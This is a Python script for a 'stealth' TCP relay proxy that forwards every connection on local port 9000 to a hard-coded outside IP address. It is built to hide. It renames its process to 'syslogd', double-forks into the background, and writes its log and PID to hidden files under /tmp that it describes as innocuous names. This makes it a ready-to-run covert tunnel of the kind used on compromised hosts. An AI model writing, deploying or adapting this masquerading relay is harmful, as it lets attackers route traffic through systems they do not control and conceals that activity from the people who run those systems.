#!/usr/bin/env python3
"""
Stealth TCP Relay Proxy
Forwards connections from local port to upstream relay.
Runs as a background daemon with minimal footprint.
"""

import socket
import threading
import sys
import os
import signal
import logging
from datetime import datetime

# Config
LOCAL_HOST = "0.0.0.0"
LOCAL_PORT = 9000
UPSTREAM_HOST = "20.214.253.39"
UPSTREAM_PORT = 9000
BUFFER_SIZE = 65536
LOG_FILE = "/tmp/.syslogd"  # Innocuous name

# Stealth: Disable verbose logging by default
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.WARNING,
    format="%(asctime)s %(message)s",
    datefmt="%b %d %H:%M:%S"
)
log = logging.getLogger("relay")

# Connection tracking
active_connections = 0
lock = threading.Lock()


def proxy_data(src, dst, direction):
    """Forward data between two sockets."""
    global active_connections
    try:
        while True:
            data = src.recv(BUFFER_SIZE)
            if not data:
                break
            dst.sendall(data)
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        with lock:
            active_connections -= 1
        try:
            src.close()
        except:
            pass
        try:
            dst.close()
        except:
            pass


def handle_client(client_sock, client_addr):
    """Handle a single client connection."""
    global active_connections
    
    # Connect to upstream
    try:
        upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        upstream_sock.settimeout(10)
        upstream_sock.connect((UPSTREAM_HOST, UPSTREAM_PORT))
        upstream_sock.settimeout(None)
    except Exception as e:
        log.warning(f"Upstream connect failed: {e}")
        client_sock.close()
        with lock:
            active_connections -= 1
        return

    # Bidirectional proxy
    t1 = threading.Thread(target=proxy_data, args=(client_sock, upstream_sock, "c2u"), daemon=True)
    t2 = threading.Thread(target=proxy_data, args=(upstream_sock, client_sock, "u2c"), daemon=True)
    t1.start()
    t2.start()


def daemonize():
    """Fork to background (Unix double-fork)."""
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    # Redirect stdio
    sys.stdin = open(os.devnull, "r")
    sys.stdout = open(os.devnull, "w")
    sys.stderr = open(os.devnull, "w")


def main():
    # Stealth: rename process
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, b"syslogd", 0, 0, 0)
    except:
        pass

    # Daemonize
    if "--foreground" not in sys.argv:
        daemonize()

    # Write PID
    with open("/tmp/.syslogd.pid", "w") as f:
        f.write(str(os.getpid()))

    # Handle signals
    def shutdown(sig, frame):
        try:
            os.unlink("/tmp/.syslogd.pid")
        except:
            pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, shutdown)
    signal.signal(signal.SIGINT, shutdown)

    # Start server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LOCAL_HOST, LOCAL_PORT))
    server.listen(128)

    log.warning(f"Relay proxy started on {LOCAL_HOST}:{LOCAL_PORT} -> {UPSTREAM_HOST}:{UPSTREAM_PORT}")

    while True:
        try:
            client_sock, client_addr = server.accept()
            with lock:
                active_connections += 1
            threading.Thread(target=handle_client, args=(client_sock, client_addr), daemon=True).start()
        except KeyboardInterrupt:
            break
        except Exception as e:
            log.warning(f"Accept error: {e}")

    server.close()


if __name__ == "__main__":
    main()
